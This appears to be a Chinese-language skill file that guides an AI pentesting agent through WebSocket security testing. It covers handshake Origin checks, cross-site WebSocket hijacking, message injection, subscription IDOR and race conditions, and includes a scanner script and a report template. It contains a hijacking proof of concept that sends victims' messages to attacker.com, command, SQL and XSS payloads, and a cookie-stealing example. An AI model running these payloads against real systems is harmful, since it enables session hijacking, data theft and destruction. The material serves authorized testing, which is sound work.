---
name: websocket-security-testing
description: WebSocket协议安全测试专项技能，覆盖握手劫持、消息注入、认证绕过、CSRF、订阅越权等WebSocket特有攻击面，适用于实时通信、聊天、协作、游戏等场景
metadata:
  version: 1.0.0
  categories: [web-security, protocol-testing, realtime-communication]
  requires_tools: [chrome-devtools, agent-browser]
---

# WebSocket Security Testing

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

WebSocket是HTML5引入的全双工通信协议，广泛用于实时应用（聊天、协作编辑、在线游戏、股票行情、IoT控制）。但WebSocket的安全测试与传统HTTP有本质区别：

**WebSocket特有风险**：
- 握手阶段可被劫持（HTTP→WS升级）
- 消息无标准格式（JSON/XML/Protobuf/自定义）
- 缺少传统HTTP安全机制（CORS在WS中不适用）
- 长连接状态管理复杂
- 订阅模型易产生越权（特别是GraphQL Subscription）

本skill提供系统化WebSocket渗透测试方法论。

---

## 使用场景

- ✅ 目标使用WebSocket（`ws://` 或 `wss://`）
- ✅ 实时功能：聊天/通知/协作/游戏/监控
- ✅ GraphQL Subscription
- ✅ Socket.io/SockJS/SignalR等库
- ✅ 需要测试长连接认证和订阅权限

---

## WebSocket基础

### 协议握手流程

```http
# 客户端请求升级
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com

# 服务器响应
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 消息格式示例

```javascript
// JSON格式（最常见）
{"type": "message", "content": "Hello", "to": "user123"}

// GraphQL Subscription
{"type": "start", "id": "1", "payload": {"query": "subscription { messageAdded { text } }"}}

// 自定义协议
CHAT|user123|Hello World

// Protobuf二进制
<binary data>
```

---

## 测试流程

### 阶段1：WebSocket发现

#### 1.1 被动发现

```javascript
// 使用chrome-devtools监控WS连接
chrome-devtools_list_network_requests({
  resourceTypes: ['websocket']
})

// 输出示例:
// ws://example.com/socket.io/?EIO=4&transport=websocket
// wss://api.example.com/graphql
```

#### 1.2 主动发现

```python
# 从lazy-js-discovery的结果中提取WS端点
import re

# 正则提取JS代码中的WS URL
ws_patterns = [
    r'new WebSocket\([\'"`]([^\'"` ]+)[\'"`]',
    r'io\([\'"`]([^\'"` ]+)[\'"`]',  # Socket.io
    r'sockjs\([\'"`]([^\'"` ]+)[\'"`]',
    r'createClient.*url:\s*[\'"`]([^\'"` ]+)[\'"`]',  # GraphQL WS
]

for pattern in ws_patterns:
    matches = re.findall(pattern, js_code)
    # ws_endpoints.append(matches)
```

#### 1.3 常见WebSocket路径

```
/socket.io/
/ws
/websocket
/chat
/graphql
/cable  (Rails ActionCable)
/sockjs-node/
/ws/notifications
/_next/webpack-hmr  (Next.js开发模式)
```

---

### 阶段2：握手安全测试

#### 2.1 Origin验证绕过

**漏洞原理**：服务器未验证`Origin`头，允许任意来源建立WS连接。

**测试方法**：

```python
# 使用chrome-devtools注入修改Origin
chrome-devtools_evaluate_script({
  function: `() => {
    const ws = new WebSocket('wss://target.com/chat');
    // 注意：浏览器环境无法直接修改Origin头
    // 需要使用外部工具如wscat或自定义客户端
  }`
})
```

**外部工具测试**（需要在目标环境手工执行）：

```bash
# 使用wscat测试不同Origin
wscat -c wss://target.com/chat --origin http://evil.com

# 使用Python websocket-client
import websocket
ws = websocket.create_connection('wss://target.com/chat',
    origin='http://evil.com')
```

**预期结果**：
- ✅ 安全实现：服务器返回403或立即断开
- ❌ 存在漏洞：连接成功建立

#### 2.2 认证绕过测试

**场景**：握手时通过URL参数或Cookie传递token。

```javascript
// 场景1：URL参数传token
const ws = new WebSocket('wss://target.com/chat?token=abc123');

// 场景2：通过Cookie（浏览器自动发送）
// Cookie: session_id=xyz789

// 场景3：通过子协议
const ws = new WebSocket('wss://target.com/chat', ['auth-token-abc123']);
```

**测试步骤**：

```markdown
1. 正常建立连接，记录握手请求
2. 修改token/cookie为无效值
3. 完全移除认证参数
4. 使用过期token
5. 使用其他用户的token（如果可获取）

FOR EACH 测试场景:
  - 尝试建立连接
  - 检查是否成功握手
  - 发送消息测试功能可用性
```

**常见漏洞**：

```python
# 漏洞1：握手验证token，但连接建立后不再校验
# 攻击：token过期后连接仍可用

# 漏洞2：token在URL中明文传输（ws://非加密）
# 攻击：中间人窃听token

# 漏洞3：接受任意token格式
# 攻击：token=anything 绕过认证
```

#### 2.3 CSWSH (Cross-Site WebSocket Hijacking)

**漏洞原理**：类似CSRF，恶意站点诱使受害者浏览器建立WS连接到目标站点。

**PoC示例**：

```html
<!-- 攻击者控制的evil.com页面 -->
<!DOCTYPE html>
<html>
<body>
<script>
// 受害者访问此页面时，浏览器自动带上target.com的Cookie
const ws = new WebSocket('wss://target.com/chat');

ws.onopen = () => {
  // 发送恶意消息
  ws.send(JSON.stringify({
    type: 'transfer',
    amount: 1000,
    to: 'attacker_account'
  }));
};

ws.onmessage = (event) => {
  // 窃取私密消息
  fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
};
</script>
</body>
</html>
```

**测试步骤**：

```markdown
1. 创建上述PoC页面
2. 受害者已登录target.com
3. 诱使受害者访问evil.com
4. 观察WebSocket是否成功建立并可发送消息
```

**防御验证**：

```python
# 检查服务器是否验证：
# 1. Origin头（严格匹配白名单）
# 2. CSRF token（在握手时验证）
# 3. SameSite Cookie（Strict或Lax）
```

---

### 阶段3：消息注入测试

**重要：以下 payload 仅为参考方向。必须先分析目标WebSocket的消息格式、协议约定、服务端处理逻辑，然后动态构造针对性测试消息。不要直接复制固定列表，要根据实际协议结构调整。**


#### 3.1 JSON注入

**场景**：服务器解析JSON消息但未严格验证。

```javascript
// 正常消息
{"type": "message", "content": "Hello", "to": "user123"}

// 注入测试payload
{"type": "message", "content": "Hello", "to": "admin", "isAdmin": true}
{"type": "admin_command", "action": "delete_user", "target": "victim"}
{"type": "message", "content": "<script>alert(1)</script>"}  // XSS
```

**测试步骤**：

```python
payloads = [
    # 1. 越权字段注入
    {'type': 'message', 'content': 'test', 'role': 'admin'},
    {'type': 'message', 'content': 'test', 'userId': 'other_user'},

    # 2. 类型混淆
    {'type': 'admin_broadcast', 'content': 'pwned'},
    {'type': 'system', 'action': 'shutdown'},

    # 3. XSS payload（如果消息显示在Web界面）
    {'type': 'message', 'content': '<img src=x onerror=alert(1)>'},

    # 4. NoSQL注入（如果后端是MongoDB）
    {'type': 'message', 'to': {'$ne': None}},  # 发送给所有人

    # 5. SQL注入（如果消息存储到SQL数据库）
    {'type': 'message', 'content': "'; DROP TABLE messages; --"},
]

for payload in payloads:
    ws.send(json.dumps(payload))
    # 观察服务器响应和副作用
```

#### 3.2 GraphQL Subscription注入

**场景**：GraphQL通过WS实现订阅。

```javascript
// 正常订阅
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { messageAdded(roomId: \"room1\") { text author } }"
  }
}

// 注入测试
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { messageAdded(roomId: \"admin_room\") { text author } }"
  }
}

// 越权订阅：订阅其他用户的私有频道
{
  "type": "start",
  "id": "1",
  "payload": {
    "query": "subscription { messageAdded(roomId: \"admin_room\") { text author } }"
  }
}
```

**测试重点**：

```markdown
1. 订阅越权：订阅其他用户的私有频道
2. 深度限制绕过：嵌套订阅
3. Introspection：通过WS查询schema

#### 3.3 命令注入

**场景**：自定义协议解析存在漏洞。

```python
# 假设协议格式：COMMAND|param1|param2
normal = "CHAT|user123|Hello"

# 注入测试
injection_payloads = [
    "CHAT|user123|Hello; cat /etc/passwd",  # 命令注入
    "CHAT|user123|Hello\x00admin",          # NULL字节注入
    "ADMIN|delete_all|*",                   # 未授权命令
    "CHAT|../../../admin|Hi",               # 路径遍历
]
```

---

### 阶段4：订阅越权测试

#### 4.1 房间/频道越权

**测试场景**：

```javascript
// 用户A只能订阅room_A
ws.send(JSON.stringify({type: 'subscribe', room: 'room_A'}));  // 正常

// 尝试订阅其他用户的房间
ws.send(JSON.stringify({type: 'subscribe', room: 'room_B'}));  // 越权?
ws.send(JSON.stringify({type: 'subscribe', room: 'admin'}));   // 越权?

// IDOR: 通过ID枚举
for (let i = 1; i <= 1000; i++) {
  ws.send(JSON.stringify({type: 'subscribe', room: `room_${i}`}));
}
```

**自动化测试**：

```python
def test_subscription_idor(ws, base_room_id):
    """测试订阅IDOR"""
    discovered_rooms = []

    for room_id in range(1, 100):
        subscribe_msg = {
            'type': 'subscribe',
            'room': f'room_{room_id}'
        }
        ws.send(json.dumps(subscribe_msg))

        # 发送测试消息到该房间（如果可以）
        test_msg = {
            'type': 'message',
            'room': f'room_{room_id}',
            'content': 'IDOR_TEST'
        }
        ws.send(json.dumps(test_msg))

        # 监听是否收到消息
        response = ws.recv()
        if 'IDOR_TEST' in response:
            discovered_rooms.append(room_id)

    return discovered_rooms
```

#### 4.2 私密消息窃听

**场景**：监听其他用户间的私聊。

```javascript
// 正常：订阅自己的私信
{type: 'subscribe', channel: 'private_user123'}

// 尝试订阅他人私信
{type: 'subscribe', channel: 'private_admin'}
{type: 'subscribe', channel: 'private_*'}  // 通配符

// 修改userId字段
{type: 'subscribe', channel: 'private', userId: 'admin'}
```

---

### 阶段5：业务逻辑漏洞
---

### 阶段6：业务逻辑漏洞

#### 6.1 竞态条件

```javascript
// 场景：抢红包/秒杀
// 同时发送多个领取请求
for (let i = 0; i < 10; i++) {
  ws.send(JSON.stringify({type: 'claim', item: 'redpacket_123'}));
}
```

#### 6.2 状态不一致

```python
# 场景：断线重连后状态未正确恢复
# 1. 正常连接并订阅房间A
ws.send({'type': 'subscribe', 'room': 'roomA'})

# 2. 断开连接
ws.close()

# 3. 重新连接但不重新订阅
ws = new WebSocket(url)

# 4. 发送消息，观察是否仍可发送到roomA（状态泄露）
ws.send({'type': 'message', 'room': 'roomA', 'content': 'test'})
```

#### 6.3 支付/交易漏洞

```javascript
// 场景：通过WS发起支付
{type: 'transfer', amount: 100, to: 'merchant'}

// 测试：修改金额为负数
{type: 'transfer', amount: -100, to: 'attacker'}  // 反向转账?

// 测试：重放攻击
// 拦截合法交易消息，重复发送多次
```

---

## 实战工具集成

### 使用Chrome DevTools测试

```javascript
// 1. 在Console中建立连接
const ws = new WebSocket('wss://target.com/chat');

// 2. 监听消息
ws.onmessage = (event) => {
  console.log('Received:', event.data);
};

// 3. 发送测试payload
ws.send(JSON.stringify({
  type: 'message',
  content: '<img src=x onerror=alert(1)>'
}));

// 4. 导出历史消息
chrome-devtools_get_network_request({
  reqid: websocket_request_id,
  responseFilePath: '/tmp/ws_messages.txt'
})
```

### 使用Python脚本

```python
# 完整测试脚本示例
import asyncio
import websockets
import json

async def test_websocket_security(url):
    # 建立连接
    async with websockets.connect(url) as ws:

        # 测试1：越权订阅
        payloads = [
            {'type': 'subscribe', 'room': 'admin'},
            {'type': 'subscribe', 'room': '../../../etc/passwd'},
        ]

        for payload in payloads:
            await ws.send(json.dumps(payload))
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                print(f"Payload: {payload} -> Response: {response}")
            except asyncio.TimeoutError:
                print(f"Payload: {payload} -> No response")

        # 测试2：XSS注入
        xss_payload = {
            'type': 'message',
            'content': '<script>alert(document.domain)</script>'
        }
        await ws.send(json.dumps(xss_payload))

# 运行
asyncio.run(test_websocket_security('wss://target.com/chat'))
```

---

## 常见框架特定测试

### Socket.io

```javascript
// Socket.io特定测试
const socket = io('https://target.com');

// 测试1：监听所有事件
const originalOn = socket.on;
socket.on = function(event, handler) {
  console.log('Event registered:', event);
  return originalOn.call(this, event, handler);
};

// 测试2：发送未公开的事件
socket.emit('admin:broadcast', {message: 'pwned'});
socket.emit('internal:debug', {});

// 测试3：命名空间越权
const adminSocket = io('https://target.com/admin');
adminSocket.emit('delete_user', {userId: 'victim'});
```

### SignalR (.NET)

```javascript
// SignalR测试
const connection = new signalR.HubConnectionBuilder()
  .withUrl('https://target.com/chatHub')
  .build();

// 测试：调用未授权的Hub方法
connection.invoke('BroadcastToAll', 'pwned');
connection.invoke('GetAdminData');
```

### ActionCable (Rails)

```javascript
// ActionCable测试
const cable = ActionCable.createConsumer('wss://target.com/cable');

// 测试：订阅未授权的频道
cable.subscriptions.create({channel: 'AdminChannel'}, {
  received(data) {
    console.log('Leaked admin data:', data);
  }
});
```

---

## 输出报告模板

```markdown
# WebSocket安全测试报告

## 目标信息
- URL: wss://target.com/chat
- 框架: Socket.io v4.5.0
- 认证方式: Cookie (session_id)

## 发现的漏洞

### [高危] Cross-Site WebSocket Hijacking
**描述**: 服务器未验证Origin头，允许任意来源建立WS连接。

**PoC**:
\`\`\`html
<!-- evil.com页面 -->
<script>
const ws = new WebSocket('wss://target.com/chat');
ws.onmessage = e => fetch('https://attacker.com/log?data=' + e.data);
</script>
\`\`\`

**影响**:
- 攻击者可诱使受害者建立WS连接
- 窃听受害者的所有实时消息
- 代表受害者发送恶意消息

**修复建议**:
\`\`\`python
# 服务器端验证Origin
def on_connect(request):
    origin = request.headers.get('Origin')
    if origin not in ALLOWED_ORIGINS:
        return 403
\`\`\`

### [中危] 订阅越权 (IDOR)
**描述**: 可订阅任意房间ID，未验证用户权限。

**PoC**:
\`\`\`javascript
ws.send(JSON.stringify({type: 'subscribe', room: 'room_1'}));  // 成功
ws.send(JSON.stringify({type: 'subscribe', room: 'room_999'})); // 也成功
\`\`\`

**影响**: 遍历room ID可窃听所有房间消息

**修复建议**: 服务器端验证用户是否有权限订阅该房间

### [中危] XSS via WebSocket消息
**描述**: 消息内容未过滤，直接渲染到DOM。

**PoC**:
\`\`\`javascript
ws.send(JSON.stringify({
  type: 'message',
  content: '<img src=x onerror=alert(document.cookie)>'
}));
\`\`\`

**影响**: 窃取其他用户Cookie

**修复建议**: 消息渲染前进行HTML实体编码

## 测试覆盖
- [x] Origin验证
- [x] 认证绕过
- [x] CSWSH
- [x] 消息注入
- [x] 订阅越权
- [x] XSS
- [x] 业务逻辑
- [ ] 加密传输 (使用wss://)
- [ ] 速率限制

## 建议
1. 实施严格的Origin白名单验证
2. 在每条消息处理时验证用户权限
3. 实施消息内容过滤和输出编码
4. 添加连接和消息速率限制
5. 使用CSRF token保护关键操作
```

---

## 自动化测试脚本

```python
#!/usr/bin/env python3
"""
WebSocket安全扫描器
"""
import asyncio
import websockets
import json
from typing import List, Dict

class WebSocketScanner:
    def __init__(self, url: str):
        self.url = url
        self.findings = []

    async def test_origin_bypass(self):
        """测试Origin验证"""
        try:
            # 注意：Python websockets库默认不发送Origin
            # 需要自定义头部
            ws = await websockets.connect(
                self.url,
                origin='http://evil.com'
            )
            self.findings.append({
                'severity': 'high',
                'title': 'Origin验证缺失',
                'description': '服务器接受任意Origin'
            })
            await ws.close()
        except Exception as e:
            print(f"Origin test: {e}")

    async def test_subscription_idor(self):
        """测试订阅IDOR"""
        async with websockets.connect(self.url) as ws:
            accessible_rooms = []

            for room_id in range(1, 50):
                subscribe_msg = json.dumps({
                    'type': 'subscribe',
                    'room': f'room_{room_id}'
                })
                await ws.send(subscribe_msg)

                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=1)
                    if 'subscribed' in response.lower():
                        accessible_rooms.append(room_id)
                except asyncio.TimeoutError:
                    pass

            if len(accessible_rooms) > 5:  # 阈值
                self.findings.append({
                    'severity': 'medium',
                    'title': '订阅越权',
                    'description': f'可访问{len(accessible_rooms)}个房间'
                })

    async def test_xss_injection(self):
        """测试XSS注入"""
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
        ]

        async with websockets.connect(self.url) as ws:
            for payload in xss_payloads:
                msg = json.dumps({
                    'type': 'message',
                    'content': payload
                })
                await ws.send(msg)

                # 检查服务器是否过滤
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=1)
                    if payload in response:
                        self.findings.append({
                            'severity': 'medium',
                            'title': 'XSS via WebSocket',
                            'description': f'Payload未过滤: {payload}'
                        })
                        break
                except asyncio.TimeoutError:
                    pass

    async def run_all_tests(self):
        """运行所有测试"""
        await self.test_origin_bypass()
        await self.test_subscription_idor()
        await self.test_xss_injection()

        return self.findings

# 使用示例
async def main():
    scanner = WebSocketScanner('wss://target.com/chat')
    findings = await scanner.run_all_tests()

    print(json.dumps(findings, indent=2, ensure_ascii=False))

if __name__ == '__main__':
    asyncio.run(main())
```

---

## 最佳实践

### ✅ DO

- **优先使用wss://**（加密传输）
- **严格验证Origin头**（白名单机制）
- **每条消息都验证权限**（不要只在握手时验证）
- **实施速率限制**（连接数、消息频率）
- **记录所有WS操作**（审计日志）
- **使用CSRF token**（保护敏感操作）

### ❌ DON'T

- 不要在URL中传递token（ws://易被窃听）
- 不要信任客户端发送的任何字段（userId/role等）
- 不要跳过消息内容过滤
- 不要忽略断线重连后的状态验证
- 不要在生产环境使用明文WebSocket（ws://）

---

## 参考资料

- [OWASP WebSocket Security](https://owasp.org/www-community/vulnerabilities/WebSocket)
- [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets)
- [Cross-Site WebSocket Hijacking (CSWSH)](https://christian-schneider.net/CrossSiteWebSocketHijacking.html)
